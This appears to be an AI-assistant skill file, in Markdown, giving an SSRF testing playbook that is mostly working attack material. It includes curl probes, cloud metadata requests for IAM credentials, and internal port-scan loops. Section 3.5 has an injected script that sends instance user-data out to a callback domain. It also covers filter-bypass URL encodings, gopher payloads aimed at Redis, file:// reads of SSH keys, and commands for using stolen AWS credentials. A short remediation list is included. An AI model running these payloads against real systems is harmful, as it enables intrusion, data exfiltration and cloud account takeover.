---
name: ssrf
description: >
  Expert guidance for detecting, exploiting, and remediating Server-Side Request Forgery (SSRF)
  vulnerabilities. Covers blind SSRF, cloud metadata SSRF, internal network pivoting, filter bypasses,
  DNS rebinding, and protocol smuggling. Use this skill whenever the user mentions SSRF, server-side
  request forgery, cloud metadata endpoints (169.254.169.254, IMDSv2), internal port scanning via
  HTTP, URL redirection abuse, webhook abuse, PDF/image rendering injection, or bypassing SSRF
  protections. Also trigger for questions like "how do I test for SSRF", "find internal services via
  SSRF", "bypass SSRF filters", "exploit AWS metadata via SSRF", "detect blind SSRF", or "what
  payloads work for SSRF". Always use this skill when SSRF is mentioned, even for quick one-liner
  questions.
---

# SSRF Skill — Server-Side Request Forgery Testing

SSRF forces a server to make HTTP (or other protocol) requests on your behalf — reaching internal
services, cloud metadata APIs, or localhost that are otherwise unreachable from the internet.

---

## 1. Attack Surface Map — Start Here

Find your scenario and jump to the relevant section.

| Scenario | Section |
|----------|---------|
| Basic SSRF — URL parameter, webhook, import URL | §3.1 |
| Blind SSRF (no response reflected) | §3.2 |
| Cloud metadata (AWS, GCP, Azure) | §3.3 |
| Internal network / port scanning | §3.4 |
| Filter bypass (IP obfuscation, redirects, DNS) | §4 |
| Protocol abuse (file://, gopher://, dict://) | §5 |
| PDF / image renderer SSRF | §3.5 |
| SSRF → RCE / credential theft | §6 |
| Remediation guidance | §7 |

---

## 2. Core Concepts

- **SSRF** — The server fetches a URL you control, so you reach its internal network, not yours.
- **Blind SSRF** — The response isn't reflected back; detect via DNS pingback or timing difference.
- **OAST / out-of-band** — Use Burp Collaborator, `interactsh`, or `canarytokens.org` to detect blind hits.
- **Cloud IMDS** — Cloud providers expose `http://169.254.169.254/` with credentials; SSRF hits it.
- **TOCTOU** — DNS rebinding: first DNS resolve = allowed IP, second = internal IP.

---

## 3. Attack Techniques by Use Case

### 3.1 Basic SSRF Discovery

Common injection points: `url=`, `dest=`, `redirect=`, `uri=`, `path=`, `fetch=`, `load=`, `src=`,
webhook URLs, avatar/image upload by URL, PDF export, XML/SVG imports.

```bash
# Test with your out-of-band callback first
curl "https://target.com/fetch?url=http://YOUR-OAST-DOMAIN/"

# Then probe localhost
curl "https://target.com/fetch?url=http://127.0.0.1/"
curl "https://target.com/fetch?url=http://localhost/"
curl "https://target.com/fetch?url=http://0.0.0.0/"

# Internal RFC-1918 subnets
curl "https://target.com/fetch?url=http://10.0.0.1/"
curl "https://target.com/fetch?url=http://172.16.0.1/"
curl "https://target.com/fetch?url=http://192.168.1.1/"
```

**Signs of SSRF:**
- Response body changes (internal page content, connection refused vs timeout)
- Response time difference (fast = open port, slow/timeout = filtered)
- Out-of-band DNS/HTTP hit on your callback domain

---

### 3.2 Blind SSRF Detection

No response reflection — rely fully on out-of-band detection.

```bash
# Step 1: Set up an OAST listener (pick one)
# Option A: interactsh-client (open source)
interactsh-client          # gives you: abc123.oast.fun

# Option B: Burp Collaborator (Burp Suite Pro)
# Option C: canarytokens.org (free, no install)

# Step 2: Inject your callback URL everywhere
curl "https://target.com/api/webhook" \
  -X POST \
  -d '{"callback_url":"http://abc123.oast.fun/ssrf-test"}' \
  -H "Content-Type: application/json"

# Step 3: Check for DNS + HTTP hits in your OAST console
# Even a DNS hit alone = confirmed blind SSRF
```

**Where to inject for blind SSRF:**
- `Referer:` header
- `Host:` header (for virtual hosting bypass)
- XML external entity (`<!ENTITY xxe SYSTEM "http://abc123.oast.fun">`)
- SVG `<image href="http://abc123.oast.fun">`
- PDF generators (HTML-to-PDF with `<img src=...>`)

---

### 3.3 Cloud Metadata (IMDS) Exploitation

#### AWS EC2 — IMDSv1 (no auth required)

```bash
# Baseline check
http://169.254.169.254/latest/meta-data/

# Get IAM credentials (high value!)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Full credential response:
# {"AccessKeyId":"...","SecretAccessKey":"...","Token":"..."}

# Other useful endpoints
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data          # often contains secrets/scripts
```

#### AWS EC2 — IMDSv2 (token required — needs two requests)

```bash
# Step 1: Get token (PUT request — harder to reach via basic SSRF)
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

> **Note:** IMDSv2 is much harder — requires PUT support. If the app uses a redirect chain or
> `gopher://` you may still reach it. Focus on IMDSv1 first; many AWS accounts still allow it.

#### GCP

```bash
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

#### Azure

```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

#### DigitalOcean

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/account-keys
```

---

### 3.4 Internal Network / Port Scanning

Once you confirm SSRF, map the internal network.

```bash
# Timing-based port scan — open ports respond fast, filtered ones timeout
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  time curl -s "https://target.com/fetch?url=http://10.0.0.1:$port/" &
done

# Subnet sweep — look for response size differences
for i in $(seq 1 254); do
  curl -s "https://target.com/fetch?url=http://10.0.0.$i/" &
done | grep -v "Connection refused"
```

**High-value internal services to probe:**

| Service | Default Port | URL Path |
|---------|-------------|----------|
| Elasticsearch | 9200 | `/_cat/indices` |
| Redis | 6379 | (use `gopher://` — §5) |
| MongoDB | 27017 | (TCP only) |
| Kubernetes API | 6443 / 8443 | `/api/v1/namespaces` |
| Docker daemon | 2375 | `/containers/json` |
| Consul | 8500 | `/v1/catalog/services` |
| Prometheus | 9090 | `/metrics` |
| Jenkins | 8080 | `/` |
| Grafana | 3000 | `/api/datasources` |

---

### 3.5 PDF / Image Renderer SSRF

HTML-to-PDF generators (wkhtmltopdf, headless Chrome, PhantomJS) and image servers often make
outbound requests.

```html
<!-- Inject into any HTML field that gets rendered to PDF/image -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<iframe src="http://169.254.169.254/latest/meta-data/">
<script>
  fetch("http://169.254.169.254/latest/user-data")
    .then(r => r.text())
    .then(t => fetch("http://YOUR-OAST-DOMAIN/?d=" + btoa(t)));
</script>
```

---

## 4. Filter Bypass Techniques

Defenders often block `127.0.0.1`, `localhost`, and `169.254.169.254`. Here's how to bypass:

### 4.1 IP Obfuscation

```
# Decimal / octal / hex encoding of 127.0.0.1
http://2130706433/           # decimal
http://0177.0.0.1/           # octal
http://0x7f.0x0.0x0.0x1/    # hex
http://127.1/                # short form
http://[::1]/                # IPv6 localhost
http://[::ffff:127.0.0.1]/   # IPv4-mapped IPv6

# 169.254.169.254 encoded
http://2852039166/           # decimal
http://0xa9fea9fe/           # hex
http://169.254.169.254%23.evil.com/   # fragment trick (some parsers)
```

### 4.2 DNS Rebinding

Register a domain where DNS alternates between an allowed IP and 169.254.169.254:

- Tools: `rbndr.us`, `nip.io` tricks, custom NS with low TTL
- Workflow: App checks URL → DNS resolves to your allowed IP (passes) → app fetches → DNS resolves to 169.254.169.254 (hits IMDS)

### 4.3 Redirect Chains

If the app follows redirects:

```bash
# Host a redirect server
python3 -c "
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location','http://169.254.169.254/latest/meta-data/')
        self.end_headers()
http.server.HTTPServer(('',8888),H).serve_forever()
"
# Then inject: https://target.com/fetch?url=http://YOUR-SERVER:8888/
```

### 4.4 URL Parser Confusion

```
http://evil.com@127.0.0.1/          # user-info bypass
http://127.0.0.1#.evil.com/         # fragment bypass
http://127.0.0.1?.evil.com/         # query bypass
http://localhost%00.evil.com/       # null byte
http://169.254.169.254.nip.io/      # wildcard DNS service
http://spoofed.burpcollaborator.net # if target is lax on validation
```

---

## 5. Protocol Abuse

### 5.1 `file://` — Local File Read

```
file:///etc/passwd
file:///proc/self/environ     # env vars, often has secrets
file:///proc/self/cmdline
file:///app/config.yml
file:///var/www/html/.env
file:///root/.ssh/id_rsa
```

### 5.2 `gopher://` — Raw TCP / Redis / SMTP

`gopher://` sends raw bytes to any TCP service — essential for Redis exploitation.

```bash
# Redis: FLUSHALL + SET webshell
# URL-encode the payload and prefix with gopher
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A

# Use Gopherus (automates payload generation)
# https://github.com/tarunkant/Gopherus
python2 gopherus.py --exploit redis
python2 gopherus.py --exploit smtp
python2 gopherus.py --exploit mysql
```

### 5.3 `dict://` — Redis / Info Leak

```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/CONFIG:GET:*
```

---

## 6. SSRF → Impact Escalation

| Technique | Impact |
|-----------|--------|
| Steal AWS IAM creds via IMDS | Lateral movement to all AWS services |
| Hit internal Kubernetes API | Pod creation, secret exfil |
| POST to internal admin panel | Account takeover, config change |
| Redis `gopher://` write | RCE via cron/SSH authorized_keys |
| Internal Elasticsearch | Mass data exfiltration |
| `file://` read | Config files, .env, private keys, /etc/shadow |

**Post-SSRF with AWS credentials:**

```bash
# Configure stolen creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Enumerate what the role can do
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ROLE-NAME
aws s3 ls
aws secretsmanager list-secrets
```

---

## 7. Remediation Guidance

For developers / defenders:

1. **Allowlist outbound URLs** — Only permit specific domains/IPs needed by the feature.
2. **Block private IP ranges** in your HTTP client before making requests: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`.
3. **Resolve and re-check** — After DNS resolution, verify the resolved IP is still in the allowlist (prevents DNS rebinding).
4. **Disable unused URL schemes** — Block `file://`, `gopher://`, `dict://`, `ftp://` in your HTTP client.
5. **Enable IMDSv2** on all EC2 instances — Prevents IMDSv1 single-request exploitation.
6. **Do not follow redirects** unless required; if you do, re-validate the final destination.
7. **Use a dedicated egress proxy** with strict allowlisting for all server-side HTTP calls.

---

## 8. Quick Reference — Payload Cheatsheet

```
# Localhost variants
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://2130706433/        (decimal 127.0.0.1)
http://0x7f000001/        (hex 127.0.0.1)

# AWS IMDS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# File read
file:///etc/passwd
file:///proc/self/environ

# OAST blind detection
http://YOUR-COLLABORATOR-ID.burpcollaborator.net/
http://YOUR-ID.oast.fun/
```

---

## 9. Tools

| Tool | Purpose | Install |
|------|---------|---------|
| `interactsh-client` | Blind SSRF OOB detection | `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |
| `Gopherus` | Gopher:// payload generator | `git clone https://github.com/tarunkant/Gopherus` |
| Burp Suite (Pro) | Collaborator + active scan | [portswigger.net](https://portswigger.net) |
| `ssrfmap` | Automated SSRF exploitation | `git clone https://github.com/swisskyrepo/SSRFmap` |
| `canarytokens.org` | Free OOB callback (no install) | [canarytokens.org](https://canarytokens.org) |
| `nip.io` / `sslip.io` | Wildcard DNS for IP bypasses | No install — DNS service |

---

## 10. SSRF Testing Checklist

1. **Identify injection points** — All URL params, headers (`Referer`, `Host`), webhooks, XML/SVG imports, PDF generators
2. **Probe OAST** — Confirm out-of-band callback before going further
3. **Test localhost / internal IPs** — Look for response differences
4. **Hit cloud IMDS** — `169.254.169.254` — check for IAM creds
5. **Try IP obfuscation** — If blocked, use decimal/hex/IPv6 variants
6. **Try redirect bypass** — If app follows redirects, host a redirect to internal
7. **Enumerate internal ports** — Timing-based scan on discovered internal hosts
8. **Probe high-value services** — Redis, Elasticsearch, Kubernetes, Docker
9. **Try protocol abuse** — `file://`, `gopher://` if applicable
10. **Document full impact chain** — From SSRF to credential access / RCE
